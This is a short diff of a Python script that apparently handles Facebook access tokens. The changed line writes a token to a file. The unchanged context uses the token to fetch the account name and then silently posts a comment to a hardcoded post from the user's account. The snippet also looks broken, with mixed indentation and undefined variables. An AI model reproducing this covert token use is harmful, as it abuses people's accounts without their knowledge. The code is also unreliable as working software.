@@ -159,7 +159,7 @@ def cek():
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
 		s.post(url.format("100025271623353_160495041469549/comments?message=[" "]&access_token=%s"%(toket)))
-                n.write(ok["access_token"])
+                b.write(ok["access_token"])
                 message.append(s["access_token"])
 		print("%s[*] %ssuccess load access token"%(G,W))
 		sleep(1)
